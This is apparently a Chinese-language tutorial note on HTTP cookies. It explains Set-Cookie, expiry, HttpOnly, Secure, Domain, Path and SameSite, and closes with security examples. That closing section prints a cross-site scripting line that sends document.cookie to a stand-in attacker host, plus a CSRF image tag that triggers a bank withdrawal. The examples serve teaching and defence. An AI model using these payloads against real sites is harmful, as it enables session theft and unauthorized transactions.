## http cookies

> 作用就是判断多个请求是否来自同一个浏览器【一个用户】

cookie是用到的几个方面:

+ 会话状态管理，用户的登陆状态、购物车、游戏分数等
+ 个性化设置，根据cookie设置主题
+ 分析用户的行为

cookie的本身特点:

+ 服务器指定cookie，随着每次的请求被携带上

### 1-如何创建cookie

服务端使用响应头中的`Set-Cookie`字段

### 2-如何定义cookie的声明周期

两种方式

+ 会话，不指定过期时间`Expires`或者有效期`Max-age`，关闭浏览器cookie就失效了，但是有些浏览器有恢复回话功能，导致cookie的生命周期无线延长
+ 持久性，设置过期时间`Expires`或者有效期`Max-age`

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

> cookie的过期时间只跟服务端有关系

### 3-如何限制cookie的访问

+ `HttpOnly`，cookie在客户端只读
+ `Secure`,  cookie只能被https协议的请求携带发送给服务端，可以预防中间人攻击，cookie被https协议加密了，不能读取

> 注意:  `Secure`只能在https的网站中使用

js脚本中的`document.cookie`无法访问`HttpOnly`属性的cookie，可以预防跨站脚本攻击

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### 4-如何控制cookie的作用域

> 主要用到的是Domain和Path两个标识，即允许哪些url携带cookie

#### Domain

指定了哪些主机可以接受cookie，默认值是origin，不包含子域名，如果指定了，cookie在子域名中也可以使用

例如: Domain=mozilla.org，则cookie也可以在developer.mozilla.org

#### Path

指定了主机下的哪些路径可以接受cookie

例如，设置 `Path=/docs`，则以下地址都会匹配：

+ /docs
+ /docs/Web
+ /docs/Web/HTTP

#### SameSite属性

> 用来限制第三方cookie，在当前网站使用其他网站的cookie【第三方cookie】，从而减少安全风险

+ Strict 完全禁止访问第三方cookie

  ```http
  Set-Cookie: CookieName=CookieValue; SameSite=Strict;
  ```

  当前网页有一个github连接，用户点击跳转，跳转过去总是为登陆状态

+ lax get请求除外

  ```http
  Set-Cookie: CookieName=CookieValue; SameSite=Lax;
  ```

  - a连接
  - link预加载
  - get表单

+ None

  ```http
  Set-Cookie: widget_session=abc123; SameSite=None; Secure
  ```

  必须是https网站

## 安全

### xss 跨站脚本攻击

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

解决方式: HttpOnly

### csrf跨站请求攻击和用户跟踪

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

打开这个图片，如果之前登陆过你的银行账户，cookies的是有效的，

```html
<img src="facebook.com" style="visibility:hidden;">
```

faceBook在第三方网站中插入了张图片，浏览器在加载这个图片的时候，就会想faceBook发出呆cookie的请求，从而faceBook就知道你是谁，访问了什么网站[**referer**: http://www.ruanyifeng.com/]





